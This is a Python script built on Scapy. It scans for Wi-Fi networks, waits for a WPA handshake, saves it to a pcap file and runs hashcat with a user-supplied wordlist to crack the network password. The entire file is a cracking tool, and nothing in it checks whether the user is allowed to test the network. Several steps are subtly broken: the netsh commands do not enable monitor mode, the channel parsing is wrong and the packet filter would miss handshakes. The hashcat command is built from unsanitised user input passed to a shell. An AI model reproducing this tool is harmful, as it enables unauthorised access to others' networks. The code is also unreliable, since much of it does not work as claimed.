import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Elt
import sys
import signal
import os
from scapy.sendrecv import sniff
#from scapy.arch.windows import get_windows_if_list, set_interface_monitor_mode
from scapy.config import conf

import subprocess
import time
from scapy.layers.dot11 import Dot11ProbeReq
from scapy.layers.dot11 import RadioTap
from scapy.sendrecv import srp
from scapy.utils import wrpcap


# Define the function to scan for Wi-Fi networks
def scan_for_networks():
    networks = []

    # Use Scapy to send a broadcast probe request and collect the responses
    probe_req = RadioTap() / Dot11(type=0, subtype=4) / Dot11ProbeReq() / Dot11Elt(ID='SSID',info='', len=0)
    probe_res = srp(probe_req, timeout=5, verbose=0)[0]

    # Extract the SSID and channel information from the responses
    for response in probe_res:
        ssid = response[1].info.decode()
        bssid = response[1].addr3
        channel = int(ord(response[0].underlayer.payload.getfieldval("info")))
        networks.append((ssid, bssid, channel))

    # Print the list of networks and their information
    print("Found the following Wi-Fi networks:")
    for ssid, bssid, channel in networks:
        print("SSID: {}, BSSID: {}, Channel: {}".format(ssid, bssid, channel))

# Define the function to capture a Wi-Fi handshake and run a hashcat brute-force attack
def test_wifi_password():
    interface = "Wi-Fi" # Change this to the name of your wireless interface
    ssid = input("Enter the SSID of the Wi-Fi network: ")
    channel = int(input("Enter the channel of the Wi-Fi network: "))

    # Set the wireless interface to monitor mode and switch to the target channel
    os.system("netsh interface set interface " + interface + " admin=enabled")
    os.system("netsh wlan set hostednetwork mode=allow ssid=MyVirtualNetwork key=MyPassword")
    os.system("netsh wlan start hostednetwork")
    os.system("netsh wlan set channel " + str(channel) + " interface=" + interface)

    # Use Scapy to capture a Wi-Fi handshake
    print("Waiting for a Wi-Fi handshake...")
    sniff_filter = "ether proto 0x888e and ether host ff:ff:ff:ff:ff:ff"
    handshake = None
    while True:
        sniffed_packet = sniff(iface=interface, filter=sniff_filter, count=1)
        if sniffed_packet:
            handshake = sniffed_packet[0]
            break

    # Save the handshake to a file
    timestamp = int(time.time())
    handshake_path = "{}_handshake.pcap".format(timestamp)
    wrpcap(handshake_path, handshake)

    # Run hashcat with a brute-force attack to crack the password
    wordlist_path = input("Enter the path to the wordlist file: ")
    print("Running hashcat...")
    hashcat_cmd = "hashcat.exe -m 2500 " + handshake_path + " " + wordlist_path
    output = subprocess.check_output(hashcat_cmd, shell=True, stdin=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # Print the results
    print(output.decode())

# Define the main function to display the options and run the selected action
if __name__ == "__main__":
    while True:
        print("Select an option:")
        print("1. Scan for Wi-Fi networks")
        print("2. Test a Wi-Fi password")
        choice = input("Enter your choice (1 or 2): ")

        if choice == "1":
            scan_for_networks()
            break
        elif choice == "2":
            test_wifi_password()
            break
        else:
            print("Invalid choice.")





    

